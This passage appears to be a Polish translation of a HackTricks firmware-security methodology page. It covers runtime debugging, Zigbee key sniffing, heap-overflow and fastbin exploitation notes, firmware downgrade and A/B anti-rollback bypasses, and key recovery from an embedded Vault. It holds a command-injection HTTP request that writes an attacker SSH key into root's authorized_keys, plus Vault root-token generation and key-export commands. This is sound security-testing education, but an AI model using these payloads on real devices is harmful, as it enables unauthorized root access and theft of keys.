Aby powtarzalnie izolować usterki, zapisuj pliki znaczników z sygnaturami czasowymi na stabilnym, zapisywalnym woluminie i weryfikuj je w trybie offline; `/dev/kmsg`, FIFO i nietrwałe konsole mogą powodować fałszywie ujemne wyniki z powodu ograniczania częstotliwości lub przedwczesnego zakończenia procesu. Przed zmianą niepowiązanego kodu porównuj też dokładne interfejsy na poszczególnych warstwach: `uname -r` z `/lib/modules/`, funkcje ext4 na dysku z konfiguracją jądra, a generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników ustalonymi na podstawie PCI. Komponent może istnieć, a nawet poprawnie załadować się przez `dlopen()`, lecz nadal być bezużyteczny, jeśli jego odbiorca oczekuje innego ABI.<sup>[[11]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używa się rzeczywistego lub emulowanego środowiska urządzenia. Niezbędne jest zachowanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, co czasem wymaga ponownego uruchomienia emulacji. Analiza powinna ponownie objąć system plików, wykorzystywać ujawnione strony internetowe i usługi sieciowe oraz badać podatności bootloadera. Testy integralności firmware'u mają kluczowe znaczenie dla wykrywania potencjalnych podatności typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać punkty przerwania oraz identyfikować podatności za pomocą fuzzingu i innych technik.

W przypadku celów wbudowanych, które nie mają pełnego debuggera, **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / radio-co-processor

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces działający w przestrzeni użytkownika Linuksa. Przydatny workflow polega na odwzorowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** działający na radio MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do Linuksa (na przykład `/dev/tty*`)
4. **Dyspozytor aplikacji** w głównym demonie
5. **Handler specyficzny dla protokołu / maszyna stanów**

Ta architektura daje dwa cele do reverse engineeringu zamiast jednego. Jeśli kontroler przekształca binarne ramki radiowe w protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odtwórz:

- **Grupy komunikatów** i tablice dyspozytora
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i własny `cluster_command`)
- Które handlery są osiągalne tylko podczas **commissioning**, wykrywania urządzeń lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuchanie ruchu podczas commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 zmniejszają to ryzyko, dlatego sprawdź, czy testowane urządzenie rzeczywiście ich wymaga.

### Handlery protokołów specyficzne dla producenta i osiągalność ograniczona przez FSM

Polecenia Zigbee/ZCL specyficzne dla producenta są często lepszym celem niż standaryzowane klastry, ponieważ trafiają do **własnego kodu parsującego** i wewnętrznych **FSM**, których walidacja jest słabiej przetestowana.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Analizuj wstecz dyspozytor poleceń, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odtwórz tablice **stanów FSM**, **zdarzeń**, **warunków sprawdzających**, **akcji** i **stanów następnych**.
- Znajdź **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponowień/błędów, które ostatecznie resetują lub zwalniają dane kontrolowane przez atakującego.
- Ustal, jakie prawidłowe wymiany protokołu są niezbędne, aby doprowadzić demona do podatnego stanu. Nie zakładaj, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na timing odtwarzanie pakietów z frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulacja prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) z użyciem stosu klasy producenckiej, aby udostępnić właściwe **endpoints**, **attributes** i timing commissioning.

### Klasa błędów związanych z fragmentowanym pobieraniem wbudowanych demonów

Powtarzająca się klasa błędów firmware występuje przy **fragmentowanym pobieraniu blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty weryfikują tylko kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania, czy mieści się w **pierwotnie zaalokowanym rozmiarze**.

Atakujący może wtedy wysłać:

- Pierwszy prawidłowy fragment z **małym** zadeklarowanym rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar lokalny dla pakietu, który przechodzi nowe kontrole, a mimo to powoduje przepełnienie pierwotnie zaalokowanego bufora.

Jeśli podatna ścieżka jest ukryta za logiką commissioning, exploitacja musi obejmować wystarczający poziom **emulacji urządzenia**, aby doprowadzić cel do oczekiwanego stanu pobierania modelu lub bloba przed wysłaniem wadliwych fragmentów.

### Wyzwalanie `free()` przez protokół

Wbudowanych demonach najłatwiej doprowadzić do wykorzystania metadanych sterty nie przez „czekanie na sprzątanie”, lecz przez **wymuszenie obsługi błędu przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stany **ponawiania** lub **błędu**.
- Przekrocz próg ponowień, aby demon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-podobnych** w wbudowanym Linuksie, gdzie uszkodzenie metadanych chunków może zmienić logikę unlink/unbin w prymityw zapisu. Stabilnym podejściem jest uszkodzenie **pola size**, aby skierować przechodzenie alokatora do **fałszywych chunków umieszczonych w przepełnionym buforze**, zamiast od razu nadpisywać rzeczywiste wskaźniki binów i powodować awarię procesu.

## Eksploatacja binarna i Proof-of-Concept

Przygotowanie PoC dla wykrytych podatności wymaga dogłębnego zrozumienia architektury celu i programowania w językach niskiego poziomu. Zabezpieczenia środowiska uruchomieniowego dla kodu binarnego są rzadko spotykane w systemach wbudowanych, ale gdy występują, mogą być potrzebne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące exploitacji fastbin w uClibc (wbudowany Linux)

- **Fastbins i konsolidacja:** uClibc używa fastbins podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, więc każdy fałszywy chunk musi przejść kontrole (prawidłowy rozmiar, `fd = 0` i sąsiednie chunki uznane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE przy włączonym ASLR:** jeśli ASLR jest włączone, ale główny plik binarny jest **non-PIE**, adresy w obrębie `.data/.bss` pliku binarnego są stabilne. Można obrać za cel obszar przypominający prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin do **tablicy wskaźników funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do użycia w stack pivot/łańcuchu ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu pamięci i przekazać do niego wykonanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) udostępniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i testów penetracyjnych urządzeń Internetu Rzeczy (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi potrzebnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware.

## Ataki downgrade firmware i niezabezpieczone mechanizmy aktualizacji

Nawet jeśli producent wdroży kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed przywróceniem starszej wersji (downgrade) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania sprawdza jedynie podpis za pomocą wbudowanego klucza publicznego, ale nie porównuje *wersji* (ani licznika monotonicznego) wgrywanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware z prawidłowym podpisem**, ponownie wprowadzając w ten sposób załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Pozyskaj starszy, podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN lub strony pomocy technicznej.
   * Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z katalogu `assets/firmware/` wewnątrz Android APK).
   * Znajdź go w repozytoriach stron trzecich, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny dostępny kanał aktualizacji:
   * Interfejs webowy, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia nieuwierzytelnione endpointy HTTP(S), które przyjmują bloby firmware zakodowane w Base64, dekodują je po stronie serwera i uruchamiają odzyskiwanie/aktualizację.
3. Po wykonaniu downgrade wykorzystaj podatność, która została załatana w nowszej wersji (na przykład filtr command injection dodany w późniejszym wydaniu).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu trwałości.

### Przykład: command injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (downgrade'owanym) firmware parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez sanitizacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root przez klucz SSH). W późniejszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed downgrade'em sprawia, że poprawka jest bezużyteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do swoich aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są zwykle przechowywane w postaci niezaszyfrowanej w plikach APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` czy nawet zwykłe `unzip` umożliwiają pobranie podpisanych obrazów bez dostępu do fizycznego sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Obejście anti-rollback wyłącznie w updaterze w projektach z dwoma slotami A/B

Niektórzy dostawcy implementują **ratchet** anti-downgrade, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, poleceniu recovery lub agencie OTA w userspace). Jeśli **bootloader** później sprawdza tylko podpis/CRC obrazu i ufa tablicy partycji lub metadanym slotu, nadal można obejść ochronę przed rollbackiem.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **ratchet** bezpieczeństwa / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze podpisane obrazy.
- **Bootloader** nie analizuje tego ratcheta i przed uruchomieniem wybranego slotu weryfikuje tylko nagłówek, CRC i podpis.
- Aktywacja slotu jest zapisana osobno w tablicy partycji lub liczniku generacji dla danego slotu i **nie jest kryptograficznie powiązana** z dokładnym digestem zweryfikowanego firmware.

Tworzy to w systemach z dwoma slotami prymityw **zweryfikuj jeden obraz / uruchom inny obraz**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel rozruchu, używając aktualnego, podpisanego obrazu, a potem nadpisać slot B przed ponownym uruchomieniem, bootloader może nadal uruchomić starszy obraz, ponieważ ufa jedynie wcześniej zatwierdzonym metadanym slotu.

Typowy wzorzec nadużycia:

1. Wgraj **aktualny, podpisany** firmware do nieaktywnego slotu i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył ten slot jako następny aktywny.
2. **Nie uruchamiaj jeszcze ponownie urządzenia**. W tej samej sesji ponownie wywołaj procedurę przygotowania/czyszczenia slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub logikę wyboru slotu, aby updater skasował **ten sam fizyczny slot**, który właśnie został aktywowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji, która egzekwuje ratchet, i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybiera aktywowany slot, weryfikuje tylko podpis/integralność i uruchamia stary obraz.

Na co zwrócić uwagę podczas analizy wstecznej implementacji aktualizacji A/B:

- Wybór slotu na podstawie **flag rozruchowych**, które nie są odświeżane po udanym przełączeniu.
- Procedura w stylu `prepare_passive_slot()`, która kasuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego układu**.
- Funkcja w stylu `part_write_layout()`, która tylko zwiększa **licznik generacji** / ustawia flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
- Kontrole ratchet zaimplementowane w userspace lub kodzie updatera, ale **nie** w ROM / bootloaderze / etapach secure boot.
- Procedury kasowania lub recovery, które pozostawiają slot oznaczony jako możliwy do uruchomienia, mimo że jego zawartość została usunięta i zastąpiona.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio chronione (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. podpisy są sprawdzane przez kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko podpis/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wariantu firmware**, czy też slot można zmodyfikować po jego aktywowaniu?
* Czy po udanym przełączeniu slotu urządzenie musi się ponownie uruchomić, czy też w tej samej sesji nadal można wywołać późniejsze procedury aktualizacji/kasowania?
* Czy kod userlandu wykonuje dodatkowe kontrole poprawności (np. dozwolone mapowanie partycji, numer modelu)?
* Czy *częściowe* lub *zapasowe* ścieżki aktualizacji korzystają z tej samej logiki weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatne firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych projektów z podatnym firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu osadzonego KMS/Vault

Gdy obraz aktualizacji łączy niewielkie metadane w postaci jawnej z dużym blobem o wysokiej entropii, przed próbami brute-force przeprowadź analizę kontenera:<sup>[[1]](#references)</sup>

- Zrzucić nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po zdekodowaniu ma dokładnie `256` bajtów, to mocna wskazówka, że mamy do czynienia z szyfrogramem RSA-2048, który opakowuje losowe hasło/klucz sesji firmware.
- Dołączony do tego samego pliku materiał PGP często służy wyłącznie do potwierdzania autentyczności; nie zakładaj, że odpowiada za poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nic nie daje, przeanalizuj **ścieżkę operacyjnego deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, kto odczytuje zaszyfrowany blob, który helper/API go odszyfrowuje i o jaką logiczną nazwę klucza prosi.
- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj polecenia w postaci jawnej `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty auto-unseal KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci masowej, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja mechanizmów wewnętrznych Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root w sklonowanym KMS:

- Ustaw klucze transit jako możliwe do wyeksportowania wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Sprawdź odzyskany klucz RSA, używając dokładnej pary padding/hash stosowanej przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL dostawcy (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim spróbujesz odszyfrować AES-CBC.

Dzięki temu „zaszyfrowane firmware” staje się bardziej ogólnym problemem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz offline dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie zabezpieczeń firmware za pomocą Claude: umiejętności na poziomie seniora, samodzielność na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do Twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania – część 2: obejście mechanizmu anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zacznie migać: zdalne wykorzystywanie Philips Hue Bridge przez OTA](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, część 1: rozpakowywanie](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacja jądra Linux – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Hasła BIOS-u Dell: słabe szyfrowanie XOR umożliwia odzyskanie ich z pamięci SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – narzędzie do odzyskiwania haseł BIOS-u Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
